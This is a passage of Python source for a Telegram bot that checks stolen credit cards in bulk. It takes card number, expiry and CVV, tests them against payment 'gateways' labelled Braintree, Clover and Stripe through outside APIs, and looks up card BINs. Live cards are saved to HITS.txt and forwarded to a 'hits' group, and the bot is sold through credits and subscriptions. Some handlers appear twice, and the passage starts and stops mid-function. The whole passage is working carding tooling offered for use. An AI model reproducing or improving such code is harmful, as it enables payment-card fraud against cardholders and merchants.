                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Premium Auth 2'
        }

@bot.message_handler(commands=['c15', 'Clover'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith(('.c15', '.Clover')))
def handle_c15(message):
    # Your usual restrictions
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. Use in group or subscribe.")
        return
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved.")
        return

    if not is_user_subscribed(message.from_user.id):
        if not check_flood_control(message.from_user.id):
            bot.reply_to(message, "⏳ Wait 8 seconds between commands.")
            return
        if not check_user_credits(message.from_user.id, 1):
            bot.reply_to(message, "❌ No daily credits left. Subscribe or wait reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract CC
        text = message.text
        if text.startswith(('/', '.')):
            parts = text.split(maxsplit=1)
            cc = parts[1].strip() if len(parts) > 1 else None
        else:
            cc = text.strip()

        if not cc and message.reply_to_message:
            cc = message.reply_to_message.text.strip()

        if not cc or '|' not in cc:
            bot.reply_to(message, "❌ Format: /c15 CC|MM|YY|CVV")
            return

        start_time = time.time()
        user_full_name = message.from_user.first_name + (" " + message.from_user.last_name if message.from_user.last_name else "")

        status_msg = bot.reply_to(message,
            f"↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{cc}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <i>Clover Auth [15$]</i>\n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing...</i>",
            parse_mode='HTML')

        def task():
            result = check_c15_cc(cc)
            result['user_id'] = message.from_user.id
            proc_time = time.time() - start_time
            resp_text = format_single_response(result, user_full_name, proc_time)

            bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg.message_id,
                                  text=resp_text, parse_mode='HTML')

            if result['status'] == 'APPROVED':
                try:
                    bot.send_message(HITS_GROUP_ID, resp_text, parse_mode='HTML')
                except:
                    pass

        threading.Thread(target=task).start()

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['mc15', 'mClover'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith(('.mc15', '.mClover')))
def handle_mc15(message):
    # DM & group restrictions
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. Use in group or subscribe.")
        return
    if message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved.")
        return

    # Premium only
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ Mass check is only for subscribed users. Buy a plan.")
        return

    # Cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ Too fast! Wait 20 seconds between mass checks.")
        return

    try:
        cards_text = None
        command_parts = message.text.split()

        # Get cards from command or replied message
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Send cards after command or reply to a message with cards.")
            return

        # Parse cards
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for item in line.split():
                    if '|' in item and len(item.split('|')) >= 4:
                        cards.append(item.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found (format: CC|MM|YY|CVV)")
            return

        # Limit
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT  # 30 for subscribed
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Max {max_limit} cards — checking first {max_limit} only.")

        start_time = time.time()
        user_full_name = message.from_user.first_name + (" " + message.from_user.last_name if message.from_user.last_name else "")

        status_msg = bot.reply_to(message, f"↯ Mass checking {len(cards)} cards on Clover Auth [15$]...", parse_mode='HTML')

        def mass_check_task():
            results = []
            checked = 0
            for i, card in enumerate(cards, 1):
                try:
                    result = check_c15_cc(card)  # Uses the function from previous message
                    results.append(result)
                    checked = i

                    # Live update
                    proc_time = time.time() - start_time
                    update_text = format_mchk_response(results, len(cards), proc_time, checked)
                    try:
                        bot.edit_message_text(chat_id=message.chat.id,
                                              message_id=status_msg.message_id,
                                              text=update_text,
                                              parse_mode='HTML')
                    except:
                        pass  # ignore if too long or rate limited

                except Exception as e:
                    results.append({
                        'status': 'ERROR',
                        'card': card,
                        'message': f'Check failed: {str(e)}',
                        'brand': 'UNKNOWN',
                        'country': 'UNKNOWN 🌐',
                        'type': 'UNKNOWN',
                        'gateway': 'Clover Auth [15$]'
                    })

            # Final result
            final_time = time.time() - start_time
            final_text = format_mchk_response(results, len(cards), final_time, len(cards))
            try:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=final_text,
                                      parse_mode='HTML')
            except:
                bot.reply_to(message, "Result too long — check your hits file.")

        threading.Thread(target=mass_check_task).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


# Handle both /b3 and .b3
@bot.message_handler(commands=['b4'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.b4'))
def handle_b4(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /b4 CC|MM|YYYY|CVV or .b4 CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Premium Auth 2</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_b4_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mb4'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mb4'))
def handle_mb3(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_b4_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Braintree Premium Auth 2'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def check_b4_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Braintree Premium Auth 2'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(B4_API_URL.format(formatted_cc), headers=headers, timeout=200)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth'
                    }
                    
                status = data.get('status', '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱')
                message = data.get('response', 'Declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success' , '𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error' '𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Braintree Premium Auth 2'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'Request failed: {str(e)}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Braintree Premium Auth 2'
                }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Invalid Input: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🌐',
            'type': 'UNKNOWN',
            'gateway': 'Braintree Premium Auth 2'
        }


# Handle both /b3 and .b3
@bot.message_handler(commands=['b4'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.b4'))
@bot.message_handler(func=lambda m: m.text and m.text.startswith('!b4'))
def handle_b4(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return



    # Check flood control for non-subscribed users
    if not is_user_subscribed(message.from_user.id) and not check_flood_control(message.from_user.id):
        bot.reply_to(message, "⏳ Please wait 5 seconds between commands. Buy a plan to remove this limit.")
        return

    # Check credits for non-subscribed users
    if not is_user_subscribed(message.from_user.id):
        if not check_user_credits(message.from_user.id, 1):
            remaining = get_remaining_credits(message.from_user.id)
            bot.reply_to(message, f"❌ You've used all your daily credits ({DAILY_CREDITS}). Remaining: {remaining}. Subscribe or wait for daily reset.")
            return
        deduct_credits(message.from_user.id, 1)

    try:
        # Extract card from either format
        if message.text.startswith('/'):
            parts = message.text.split()
            if len(parts) < 2:
                bot.reply_to(message, "❌ Invalid format. Use /b4 CC|MM|YYYY|CVV or .b4 CC|MM|YYYY|CVV")
                return
            cc = parts[1]
        else:  # starts with .
            cc = message.text[4:].strip()  # remove ".b3 "

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        status_msg = bot.reply_to(
            message,
            "↯ Checking..\n\n⌯ 𝐂𝐚𝐫𝐝 - <code>{}</code>\n⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>Braintree Premium Auth 2</i> \n⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - <i>Processing</i>".format(cc),
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_b4_cc(cc)
                result['user_id'] = message.from_user.id  # Added line to include user ID
                processing_time = time.time() - start_time
                response_text = format_single_response(result, user_full_name, processing_time)

                # Edit original message
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=response_text,
                                      parse_mode='HTML')

                # Auto-send approved results to hits group
                try:
                    if any(keyword in response_text.upper() for keyword in ["APPROVED", "CHARGED", "LIVE"]):
                        bot.send_message(HITS_GROUP_ID, response_text, parse_mode="HTML")
                except Exception as e:
                    print(f"[Auto Forward Error - b3] {e}")

            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                      message_id=status_msg.message_id,
                                      text=f"❌ An error occurred: {str(e)}")

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Handle both /mb3 and .mb3
@bot.message_handler(commands=['mb4'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mb4'))
def handle_mb3(message):
    # Check if user is allowed to use in DMs
    if message.chat.type == 'private' and str(message.from_user.id) not in ADMIN_IDS and not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This bot is restricted to use in DMs. You can freely use it in our group @voidxup or subscribe to use in DMs.")
        return
    elif message.chat.type != 'private' and str(message.chat.id) not in APPROVED_GROUPS:
        bot.reply_to(message, "❌ This group is not approved to use this bot.")
        return
    

    
    # Check if user is subscribed
    if not is_user_subscribed(message.from_user.id):
        bot.reply_to(message, "❌ This command is only for subscribed users. Buy a plan to use this feature.")
        return
    
    # Check mass check cooldown
    if not check_mass_check_cooldown(message.from_user.id):
        bot.reply_to(message, "⚠️ You are doing things too fast! Please wait 20 seconds between mass checks.")
        return
    
    try:
        cards_text = None
        command_parts = message.text.split()
        
        # Check if cards are provided after command
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return
            
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YYYY|CVV).")
            return
        
        # Determine max limit based on subscription status
        max_limit = MAX_SUBSCRIBED_CARDS_LIMIT if is_user_subscribed(message.from_user.id) else MAX_CARDS_LIMIT
        
        if len(cards) > max_limit:
            cards = cards[:max_limit]
            bot.reply_to(message, f"⚠️ Maximum {max_limit} cards allowed. Checking first {max_limit} cards only.")
        
        start_time = time.time()
            
        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name
            
        status_msg = bot.reply_to(message, f"↯ Checking {len(cards)} cards...", parse_mode='HTML')
        
        def check_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_b4_cc(card)
                        results.append(result)
                        
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                    except Exception as e:
                        results.append({
                            'status': 'ERROR',
                            'card': card,
                            'message': f'Invalid: {str(e)}',
                            'brand': 'UNKNOWN',
                            'country': 'UNKNOWN 🌐',
                            'type': 'UNKNOWN',
                            'gateway': 'Braintree Auth'
                        })
                        processing_time = time.time() - start_time
                        response_text = format_mchk_response(results, len(cards), processing_time, i)
                        bot.edit_message_text(chat_id=message.chat.id,
                                            message_id=status_msg.message_id,
                                            text=response_text,
                                            parse_mode='HTML')
                
                processing_time = time.time() - start_time
                response_text = format_mchk_response(results, len(cards), processing_time)
                bot.edit_message_text(chat_id=message.chat.id,
                                    message_id=status_msg.message_id,
                                    text=response_text,
                                    parse_mode='HTML')
            
            except Exception as e:
                bot.edit_message_text(chat_id=message.chat.id,
                                     message_id=status_msg.message_id,
                                     text=f"❌ An error occurred: {str(e)}",
                                     parse_mode='HTML')
        
        threading.Thread(target=check_cards).start()
    
    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


def check_ss_cc(cc):
    try:
        # Normalize input format (accept various separators and formats)
        card = cc.replace('/', '|').replace(' ', '|').replace(':', '|')
        lista = [part.strip() for part in card.split('|') if part.strip()]
        
        # Validate we have all required parts
        if len(lista) < 4:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid format. Use CC|MM|YYYY|CVV',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        cc_num = lista[0]
        mm = lista[1].zfill(2)  # Ensure 2-digit month (e.g., 3 becomes 03)
        yy_raw = lista[2]
        cvv = lista[3]
        
        # Normalize year to 4 digits - FIXED LOGIC
        if len(yy_raw) == 2:  # 2-digit year provided
            current_year_short = datetime.now().year % 100
            input_year = int(yy_raw)
            if input_year >= current_year_short - 10:  # Consider years within 10 years range
                yy = '20' + yy_raw  # 22 → 2022
            else:
                yy = '20' + yy_raw  # Default to 20xx for all 2-digit years
        elif len(yy_raw) == 4:  # 4-digit year provided
            yy = yy_raw
        else:
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid year format (use YY or YYYY)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Validate card number length
        if not (13 <= len(cc_num) <= 19):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid card number length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Validate month
        if not (1 <= int(mm) <= 12):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid month (1-12)',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Validate CVV
        if not (3 <= len(cvv) <= 4):
            return {
                'status': 'ERROR',
                'card': cc,
                'message': 'Invalid CVV length',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Check expiration (using normalized values)
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        if int(yy) < current_year or (int(yy) == current_year and int(mm) < current_month):
            return {
                'status': 'DECLINED',
                'card': f"{cc_num}|{mm}|{yy}|{cvv}",
                'message': 'Your card is expired',
                'brand': 'UNKNOWN',
                'country': 'UNKNOWN 🌐',
                'type': 'UNKNOWN',
                'gateway': 'Stripe [22.7$]'
            }
        
        # Get BIN info
        bin_info = None
        try:
            bin_response = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5)
            if bin_response.status_code == 200:
                bin_info = bin_response.json()
        except:
            pass
            
        # Set default values if BIN lookup failed
        brand = bin_info.get('brand', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_name = bin_info.get('country_name', 'UNKNOWN') if bin_info else 'UNKNOWN'
        country_flag = bin_info.get('country_flag', '🌐') if bin_info else '🌐'
        card_type = bin_info.get('type', 'UNKNOWN') if bin_info else 'UNKNOWN'
        bank = bin_info.get('bank', 'UNKNOWN') if bin_info else 'UNKNOWN'
        
        # Prepare card for API - in perfect CC|MM|YYYY|CVV format
        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"
        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Increased timeout to 60 seconds
            response = requests.get(SS_API_URL.format(formatted_cc), headers=headers, timeout=300)
            
            if response.status_code == 200:
                try:
                    data = response.json()
                except json.JSONDecodeError:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Invalid API response',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
                    
                status = data.get('status', 'Declined ❌')
                message = data.get('response', 'Your card was declined.')
                
                # Improved status detection
                if any(word in status for word in ['Live', 'Approved', 'APPROVED', 'Success']):
                    status = 'APPROVED'
                    with open('HITS.txt','a') as hits:
                        hits.write(formatted_cc+'\n')
                    return {
                        'status': 'APPROVED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
                elif any(word in status for word in ['Declined', 'Decline', 'Failed', 'Error']):
                    return {
                        'status': 'DECLINED',
                        'card': formatted_cc,
                        'message': message,
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
                else:
                    return {
                        'status': 'ERROR',
                        'card': formatted_cc,
                        'message': 'Unknown response from API',
                        'brand': brand,
                        'country': f"{country_name} {country_flag}",
                        'type': card_type,
                        'gateway': 'Stripe [22.7$]'
                    }
            else:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': f'API Error: {response.status_code}',
                    'brand': brand,
                    'country': f"{country_name} {country_flag}",
                    'type': card_type,
                    'gateway': 'Stripe [22.7$]'
                }
        except requests.exceptions.RequestException as e:
            error_msg = str(e)
            if "Read timed out" in error_msg:
                return {
                    'status': 'ERROR',
                    'card': formatted_cc,
                    'message': 'API Timeout (60s) - Server may be busy',
                    'brand': brand,
